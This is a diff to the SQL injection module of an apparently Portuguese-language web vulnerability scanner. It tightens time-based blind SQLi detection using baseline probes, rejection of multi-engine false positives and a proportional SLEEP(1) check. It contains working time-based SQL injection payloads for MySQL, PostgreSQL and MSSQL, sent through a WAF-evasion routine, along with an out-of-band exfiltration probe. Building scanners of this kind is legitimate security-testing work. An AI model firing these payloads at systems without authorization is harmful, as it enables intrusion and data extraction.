@@ -22,8 +22,10 @@ import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
 import java.time.Duration;
 import java.util.ArrayList;
+import java.util.LinkedHashMap;
 import java.util.LinkedHashSet;
 import java.util.List;
+import java.util.Map;
 import java.util.concurrent.Callable;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.function.Consumer;
@@ -52,6 +54,12 @@ public class SqlInjectionModule implements Scanner {
     private static final List<TimePayload> TIME_PAYLOADS = List.of(new TimePayload("' AND SLEEP(5)--", "MySQL"),
             new TimePayload("'; SELECT pg_sleep(5)--", "PostgreSQL"),
             new TimePayload("'; WAITFOR DELAY '0:0:5'--", "MSSQL"));
+
+    private record BaselineProbe(int statusCode, String body, long rttMs) {
+    }
+
+    private record TimeProbeResult(long elapsedMs, String body, int statusCode) {
+    }
 
     // Multi-vendor SQL error signature -- requires at least one specific token to
     // avoid
@@ -161,17 +169,33 @@ public class SqlInjectionModule implements Scanner {
 
                     // -- Phase 2: Time-Based Blind --
                     if (noTimeBased) {
-                        // Phase 3: OOB DNS exfiltration via OAST (even when time-based is skipped)
                         injectOobSqli(ctx, hc, base, path, param, log);
                         return local;
                     }
-                    long b1 = measureRtt(ctx, hc, base + path + "?" + param + "=1", log);
-                    long b2 = measureRtt(ctx, hc, base + path + "?" + param + "=2", log);
-                    if (b1 < 0 || b2 < 0) {
-                        // Target unreachable on this path -- skip to next
+
+                    BaselineProbe bl1 = probeBaseline(ctx, hc, base + path + "?" + param + "=1");
+                    BaselineProbe bl2 = probeBaseline(ctx, hc, base + path + "?" + param + "=2");
+                    if (bl1.rttMs < 0 && bl2.rttMs < 0) {
                         continue;
                     }
-                    long baselineAvg = (b1 + b2) / 2;
+
+                    boolean skip404 = (bl1.statusCode == 404 || bl1.statusCode == 410)
+                            && (bl2.statusCode == 404 || bl2.statusCode == 410);
+                    boolean skipEmpty = bl1.body.isBlank() && bl2.body.isBlank();
+                    if (skip404 || skipEmpty) {
+                        log.accept("[~] SQLi: baseline " + (skip404 ? bl1.statusCode : "body vazio") + " em " + path
+                                + " -- pulando time-based para " + param);
+                        injectOobSqli(ctx, hc, base, path, param, log);
+                        continue;
+                    }
+
+                    long baselineAvg = bl1.rttMs < 0
+                            ? bl2.rttMs
+                            : bl2.rttMs < 0 ? bl1.rttMs : (bl1.rttMs + bl2.rttMs) / 2;
+
+                    List<String> spikedEngines = new ArrayList<>();
+                    Map<String, Long> spikedDeltas = new LinkedHashMap<>();
+                    Map<String, TimePayload> spikedTps = new LinkedHashMap<>();
 
                     for (TimePayload tp : TIME_PAYLOADS) {
                         if (cancel.get()) {
@@ -179,62 +203,67 @@ public class SqlInjectionModule implements Scanner {
                         }
                         String encoded = URLEncoder.encode(WafEvasion.evasionPayload(ctx, tp.payload()), "UTF-8");
                         String url = base + path + "?" + param + "=" + encoded;
-                        try {
-                            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url))
-                                    // Allow up to 10s to accommodate SLEEP(5) + normal RTT
-                                    .timeout(Duration.ofSeconds(10)).GET().build();
-                            long start = System.currentTimeMillis();
-                            Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
-                            long elapsed = System.currentTimeMillis() - start;
+                        TimeProbeResult pr = probeTimeBased(ctx, hc, url);
+                        if (pr.elapsedMs < 0) {
+                            continue;
+                        }
+                        // Reject spikes where the server responded with an empty body --
+                        // the endpoint is not processing input. Timeouts (statusCode -1)
+                        // are exempt because the body is empty only due to the timeout.
+                        if (pr.statusCode > 0 && pr.body.isBlank()) {
+                            continue;
+                        }
+                        if (pr.elapsedMs > baselineAvg + 4000) {
+                            spikedEngines.add(tp.dbHint());
+                            spikedDeltas.put(tp.dbHint(), pr.elapsedMs - baselineAvg);
+                            spikedTps.put(tp.dbHint(), tp);
+                        }
+                    }
 
-                            if (elapsed > baselineAvg + 4000) {
-                                String endpoint = path + "?" + param + "=" + encoded;
-                                log.accept("[!!] SQLi time-based CRITICAL -- " + tp.dbHint() + " em " + endpoint
-                                        + " baseline=" + baselineAvg + "ms attack=" + elapsed + "ms");
+                    // Multi-DB inconsistency: no real server speaks 2+ SQL dialects
+                    if (spikedEngines.size() >= 2) {
+                        log.accept("[~] SQLi: " + spikedEngines.size() + " DB engines spiked ("
+                                + String.join(", ", spikedEngines) + ") em " + path + "?" + param
+                                + " -- inconsistencia multi-DB, descartando como FP");
+                        injectOobSqli(ctx, hc, base, path, param, log);
+                        continue;
+                    }
 
-                                local.add(Finding.of(id(), endpoint,
-                                        "SQL Injection -- Time-Based Blind confirmado (" + tp.dbHint() + ")",
-                                        Severity.CRITICAL,
-                                        "baseline=" + baselineAvg + "ms attack=" + elapsed + "ms" + " delta="
-                                                + (elapsed - baselineAvg) + "ms" + " | DB hint: " + tp.dbHint()
-                                                + " | Payload: " + tp.payload(),
-                                        "Blind SQL Injection confirmado por delay de " + (elapsed - baselineAvg)
-                                                + "ms acima do baseline. Permite extracao de dados via inferencia"
-                                                + " booleana / temporal mesmo sem mensagens de erro visiveis.",
-                                        "curl -G '" + base + path + "' \\\n" + "  --data-urlencode '" + param + "="
-                                                + tp.payload() + "'",
-                                        "Use prepared statements / parameterized queries. Implemente WAF com "
-                                                + "deteccao de time-based blind SQLi. Limite o timeout de queries"
-                                                + " no banco.",
-                                        cweId, cweTitle, cvssVec, cvssScore));
-                                cancel.set(true);
-                                return local;
-                            }
-                        } catch (java.net.http.HttpTimeoutException toe) {
-                            // Timeout on the attack request itself can be a positive signal only
-                            // when baseline was fast -- treat as a candidate but require delta >
-                            // 4s.
-                            long elapsed = 10_000L; // timeout = full window consumed
-                            if (elapsed > baselineAvg + 4000) {
-                                String endpoint = path + "?" + param + "=" + encoded;
-                                log.accept("[!!] SQLi time-based (timeout) CRITICAL -- " + tp.dbHint() + " em "
-                                        + endpoint);
-                                local.add(Finding.of(id(), endpoint,
-                                        "SQL Injection -- Time-Based Blind (timeout) confirmado (" + tp.dbHint() + ")",
-                                        Severity.CRITICAL,
-                                        "baseline=" + baselineAvg + "ms attack=timeout(10000ms)" + " | DB hint: "
-                                                + tp.dbHint() + " | Payload: " + tp.payload(),
-                                        "Request timeout sob payload de sleep sugere Blind SQLi temporal.",
-                                        "curl -G '" + base + path + "' \\\n" + "  --data-urlencode '" + param + "="
-                                                + tp.payload() + "'",
-                                        "Use prepared statements / parameterized queries.", cweId, cweTitle, cvssVec,
-                                        cvssScore));
-                                cancel.set(true);
-                                return local;
-                            }
-                        } catch (CircuitBreakerException cbe) {
-                            throw cbe;
-                        } catch (Exception ignored) {
+                    if (spikedEngines.size() == 1) {
+                        String engine = spikedEngines.getFirst();
+                        TimePayload tp = spikedTps.get(engine);
+                        long attackDelta = spikedDeltas.get(engine);
+                        long attackElapsed = attackDelta + baselineAvg;
+
+                        boolean confirmed = verifyProportionalSqlDelay(ctx, hc, baselineAvg, attackDelta, base, path,
+                                param, tp, log);
+                        if (confirmed) {
+                            String encoded = URLEncoder.encode(WafEvasion.evasionPayload(ctx, tp.payload()), "UTF-8");
+                            String endpoint = path + "?" + param + "=" + encoded;
+                            log.accept("[!!] SQLi time-based CRITICAL -- " + tp.dbHint() + " em " + endpoint
+                                    + " baseline=" + baselineAvg + "ms attack=" + attackElapsed
+                                    + "ms (proporcional confirmado)");
+
+                            local.add(Finding.of(id(), endpoint,
+                                    "SQL Injection -- Time-Based Blind confirmado (" + tp.dbHint() + ")",
+                                    Severity.CRITICAL,
+                                    "baseline=" + baselineAvg + "ms attack=" + attackElapsed + "ms delta=" + attackDelta
+                                            + "ms | Verificacao proporcional:" + " confirmada | DB hint: " + tp.dbHint()
+                                            + " | Payload: " + tp.payload(),
+                                    "Blind SQL Injection confirmado por delay" + " proporcional de " + attackDelta
+                                            + "ms acima do baseline. Permite" + " extracao de dados via inferencia"
+                                            + " booleana / temporal mesmo sem" + " mensagens de erro visiveis.",
+                                    "curl -G '" + base + path + "' \\\n" + "  --data-urlencode '" + param + "="
+                                            + tp.payload() + "'",
+                                    "Use prepared statements / parameterized" + " queries. Implemente WAF com"
+                                            + " deteccao de time-based blind" + " SQLi. Limite o timeout de"
+                                            + " queries no banco.",
+                                    cweId, cweTitle, cvssVec, cvssScore));
+                            cancel.set(true);
+                            return local;
+                        } else {
+                            log.accept("[~] SQLi: spike temporal em " + path + "?" + param + " (" + engine + ", delta="
+                                    + attackDelta + "ms) -- verificacao" + " proporcional falhou, descartando");
                         }
                     }
 
@@ -333,18 +362,80 @@ public class SqlInjectionModule implements Scanner {
         }
     }
 
-    /** Returns elapsed ms, or -1 on connection error (not timeout). */
-    private long measureRtt(ScanContext ctx, HttpClient hc, String url, Consumer<String> log) {
+    private BaselineProbe probeBaseline(ScanContext ctx, HttpClient hc, String url) {
         try {
             HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(6)).GET()
                     .build();
             long t0 = System.currentTimeMillis();
-            Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
-            return System.currentTimeMillis() - t0;
+            HttpResponse<String> r = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
+            long rtt = System.currentTimeMillis() - t0;
+            return new BaselineProbe(r.statusCode(), r.body() != null ? r.body() : "", rtt);
         } catch (java.net.http.HttpTimeoutException e) {
-            return 6_000L; // count a timeout as a full-window RTT sample
+            return new BaselineProbe(-1, "", 6_000L);
+        } catch (CircuitBreakerException cbe) {
+            throw cbe;
         } catch (Exception e) {
-            return -1L;
+            return new BaselineProbe(-1, "", -1L);
         }
+    }
+
+    private TimeProbeResult probeTimeBased(ScanContext ctx, HttpClient hc, String url) {
+        try {
+            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(10)).GET()
+                    .build();
+            long start = System.currentTimeMillis();
+            HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
+            long elapsed = System.currentTimeMillis() - start;
+            return new TimeProbeResult(elapsed, resp.body() != null ? resp.body() : "", resp.statusCode());
+        } catch (java.net.http.HttpTimeoutException toe) {
+            return new TimeProbeResult(10_000L, "", -1);
+        } catch (CircuitBreakerException cbe) {
+            throw cbe;
+        } catch (Exception e) {
+            return new TimeProbeResult(-1L, "", -1);
+        }
+    }
+
+    /**
+     * Proportional verification: if SLEEP(5) caused delta D above baseline, a
+     * SLEEP(1) probe must produce ~D/5 above baseline within 40% tolerance. This
+     * eliminates network jitter that coincidentally exceeds the threshold.
+     */
+    private boolean verifyProportionalSqlDelay(ScanContext ctx, HttpClient hc, long baselineAvg, long attackDelta,
+            String base, String path, String param, TimePayload tp, Consumer<String> log) {
+        String shortPayload = shortSleepPayload(tp);
+        if (shortPayload == null) {
+            return false;
+        }
+        try {
+            String encoded = URLEncoder.encode(WafEvasion.evasionPayload(ctx, shortPayload), "UTF-8");
+            String url = base + path + "?" + param + "=" + encoded;
+            TimeProbeResult pr = probeTimeBased(ctx, hc, url);
+            if (pr.elapsedMs < 0) {
+                return false;
+            }
+
+            long shortDelta = pr.elapsedMs - baselineAvg;
+            long expectedDelta = attackDelta / 5;
+            long tolerance = (long) (expectedDelta * 0.4);
+            long lowerBound = expectedDelta - tolerance;
+            long upperBound = expectedDelta + tolerance;
+
+            log.accept("[~] SQLi: proporcional " + tp.dbHint() + " -- SLEEP(1) delta=" + shortDelta + "ms expected="
+                    + expectedDelta + "ms range=[" + lowerBound + "," + upperBound + "]");
+
+            return shortDelta >= lowerBound && shortDelta <= upperBound;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private static String shortSleepPayload(TimePayload tp) {
+        return switch (tp.dbHint()) {
+            case "MySQL" -> "' AND SLEEP(1)--";
+            case "PostgreSQL" -> "'; SELECT pg_sleep(1)--";
+            case "MSSQL" -> "'; WAITFOR DELAY '0:0:1'--";
+            default -> null;
+        };
     }
 }
